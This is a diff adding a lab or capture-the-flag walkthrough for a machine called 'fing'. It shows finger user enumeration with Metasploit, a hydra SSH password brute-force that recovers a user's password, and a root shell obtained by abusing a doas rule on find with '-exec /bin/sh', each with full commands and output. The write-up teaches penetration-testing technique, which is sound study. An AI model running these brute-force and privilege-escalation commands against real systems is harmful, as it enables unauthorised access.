@@ -53,11 +53,120 @@ The victim host at 192.168.1.43 is running:
 - Finger (an old, rarely used service that my leak information).
 - An Apache HTTP server with the default page, indicating that the web server is active but no specific application has been deployed yet.
 
-### Shell 
+### Shell (Adam)
 #### 79/TCP (FINGER)
 **Use Brute-Force**
-hehee
+We can perform user enumeration using the Metasploit module **auxiliary/scanner/finger/finger_users**.
+```bash
+┌──(dungcngo㉿kali)-[~]
+└─$ msfconsole 
+Metasploit tip: Set the current module's RHOSTS with database values using 
+hosts -R or services -R
+    ----------------------------...-----------------------------
+    
+msf > use auxiliary/scanner/finger/finger_users 
+msf auxiliary(scanner/finger/finger_users) > set RHOSTS 192.168.100.230
+RHOSTS => 192.168.100.230
+msf auxiliary(scanner/finger/finger_users) > set THREADS 5
+THREADS => 5
+msf auxiliary(scanner/finger/finger_users) > set USERS_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+USERS_FILE => /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt          <----- install seclists (sudo apt -y install seclists)
+msf auxiliary(scanner/finger/finger_users) > options
+
+Module options (auxiliary/scanner/finger/finger_users):
+
+   Name        Current Setting           Required  Description
+   ----        ---------------           --------  -----------
+   RHOSTS      192.168.100.230            yes       The target host(s), see https://docs.meta
+                                                   sploit.com/docs/using-metasploit/basics/u
+                                                   sing-metasploit.html
+   RPORT       79                        yes       The target port (TCP)
+   THREADS     5                         yes       The number of concurrent threads (max one
+                                                    per host)
+   USERS_FILE  /usr/share/wordlists/sec  yes       The file that contains a list of default
+               lists/Usernames/xato-net            UNIX accounts.
+               -10-million-usernames.tx
+               t
 
 
+View the full module info with the info, or info -d command.
+```
+After filling the options needed we proceed to run the scanner and get an output: 
+```bash
+msf auxiliary(scanner/finger/finger_users) > run
+[+] 192.168.100.230:79    - 192.168.100.230:79 - Found user: mail
+[+] 192.168.100.230:79    - 192.168.100.230:79 - Found user: root
+[+] 192.168.100.230:79    - 192.168.100.230:79 - Found user: adam
+[+] 192.168.100.230:79    - 192.168.100.230:79 - Found user: news
 
+```
+Now we see there are the users **adam** and **root**.
 
+#### 22/TCP (SSH)
+**Password Brute-Force**
+We can try to brute-force `adam`'s ssh password by **hydra**.
+```bash
+┌──(dungcngo㉿kali)-[~]
+└─$ hydra -t 64 -l adam -P /usr/share/wordlists/rockyou.txt 192.168.100.230 ssh -F -I   
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-03 03:40:28
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ssh://192.168.100.230:22/
+
+[STATUS] 508.00 tries/min, 508 tries in 00:01h, 14343929 to do in 470:37h, 26 active
+[22][ssh] host: 192.168.100.230   login: adam   password: passion
+[STATUS] attack finished for 192.168.100.230 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-03 03:42:02
+```
+Got the password `passion`, this gives us an foothold into the system. We can now log into the server.
+```bash
+┌──(dungcngo㉿kali)-[~]
+└─$ ssh adam@192.168.100.230           
+The authenticity of host '192.168.100.230 (192.168.100.230)' can't be established.
+ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.100.230' (ED25519) to the list of known hosts.
+adam@192.168.100.230's password: 
+Linux fing 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+Last login: Sun Apr 23 13:21:44 2023 from 192.168.1.10
+adam@fing:~$ id ; whoami
+uid=1000(adam) gid=1000(adam) grupos=1000(adam)
+adam
+```
+
+### Privilege Escalation
+#### Enumeration
+The user `adam` has access to the `doas` binary. `Doas` is a UNIX/Linux program that allows a user to run commands in the context of another user. It is similar to the `sudo` command, but `doas` has a simpler setup process.
+
+The configuration for the `doas` program can be found in the `/etc/doas.conf		` file
+```bash
+adam@fing:~$ cat /etc/doas.conf 
+permit nopass keepenv adam as root cmd /usr/bin/find
+```
+User `adam` is allowed to run the `find` command as root without providing a password, while preserving the current environment.
+
+#### Abuse
+The `find` command is used to locate files and directories on a filesystem that match specified parameters.
+```bash
+adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/sh \; -quit
+# bash -pi
+root@fing:/home/adam# id ; whoami
+uid=0(root) gid=0(root) grupos=0(root)
+root
+```
+We use this cammand spawns as root shell via `doas` by abusing `find` with the `-exec` option to execute `/bin/sh`. Because of `-quit`, `find` stop the first match, but the root shell has already been opened.
+Run `bash -pi` to switch from the basic root shell (`sh`) to a full, interactive root bash shell.
+
+#### Flags
+With root privileges, we can read both the `user.txt` and `root.txt` flags.
+```bash
+root@fing:/home/adam# find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
+1edf2dfe68c6745e93affa42be9a80ce
+ff18a9aca2d1dac41a5c26e6667bea9d
+```
+
+***You are welcome!***
